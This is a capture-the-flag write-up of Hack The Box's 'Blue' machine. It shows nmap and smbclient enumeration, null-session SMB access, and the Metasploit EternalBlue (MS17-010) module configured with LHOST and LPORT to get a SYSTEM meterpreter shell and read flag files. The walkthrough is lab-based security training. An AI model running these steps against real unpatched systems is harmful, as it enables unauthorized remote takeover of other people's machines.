# Overview
Blue is considered a beginner-friendly box on Hack The Box; its purpose was to teach a valuable lesson about how unpatched systems can become vulnerable. The EternalBlue exploit had severe implications worldwide and has been used in large-scale ransomware attacks. It targeted Windows Server Message Block (SMB) protocol, which is used for shared access to files, printers, and other network resources. Why was it so critical? Windows is one of the most widely used operating systems globally, and this exploit, which leveraged the SMBv1 bug, enabled remote code execution attacks on the target system.

## Full Port Scan and Initial Enumeration

I kicked off with a full TCP port scan using aggressive timing to identify open services quickly.

---

```bash
nmap -sCV -p- <ip> --min-rate=1000 --min-parallelism=1000 -v
```

**Key Flags:**
- `-sC`: runs default Nmap scripts
- `-sV`: enables version detection
- `-p-`: Scans all 65535 ports
- `--min-rate=1000`: sends packets faster than the default rate.
- `--min-parallelism=1000`: sends probes in parallel for speed.

> i only use `--min-rate` and `--min-parallelism` in CTF environments to speed up discovery.

## SMB Enumeration and Null Session Access

After seeing ports `139` and `445` open, I decided to check for unauthenticated SMB Access:

```bash
smbclient -L \\\\ip\\ -N
```

**Key Flags:**
- `-L`: This option allows you to list the existing shares.
- `-N`: Allows us to try and connect to SMB without credentials (Null Session)  

This tests for null session access, and it worked! I was able to list all the available shares for us.
To further enumerate share permissions, I ran:

```bash
nmap <ip> -p 445 --script=smb-enum-shares
```
This confirmed that several shares are readable and that SMBv1 was active. This is generally a red flag on older Windows systems due to its easy exploitation.

---

## Finding The Vulnerability: MS17-010

From our Nmap scan, we can see that the target is running Windows 7 Pro, and SMBv1 is enabled. After a quick Google search for `Windows 7 Professional 7601 vulnerability`, we were met with several pages, including Microsoft talking about MS17-010, which is the EternalBlue exploit, which was a remote code execution vulnerability.

---

## Exploiting EternalBlue with Metasploit

```bash
msfconsole
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
```
Instead of typing the whole exploit path, as I just showed, we could also use the corresponding number. In my case, it was 0

After this, I set up the required options by typing 'options' and filling in the RHOST, LHOST, and LPORT fields.

**key Flags**
- `RHOST`: is the remote host, which in our case is the HTB IP.
- `LHOST` is for our local host.
- `LPORT`: is for the port we want to use

```bash
set RHOST 10.129.13.80
set LHOST <OUR  IP>
set LPORT 4444 # or whichever port you would like to use
```

I ran `check` to verify if the host was vulnerable, and metasploit did confirm it.

```bash
check
```
After confirmation, I typed 'run' and the exploit executed. Once we see `meterpreter>` we can type shell to get a shell and we are in as system!

```bash
run
shell
```

## Post-Exploitation and Flags

With full system access I was able to retrieve the user and root flags by going through Haris' folder and administrator.
Both flags reside on the desktop of each user.

```bash
cd C:\Users
dir

cd Haris\Desktop
type user.txt

cd ..\Administrator\Desktop
type root.txt
```

Flags obtained:

- `user.txt`: ✔️  
- `root.txt`: ✔️

---

## Key Takeaways
- Always check for null sessions when SMB is open
SMBv1 is still in use and can be easily exploited, as we have demonstrated.
- Always use multiple tools! In our case, we did use smbclient with nmap to get a better picture early on.
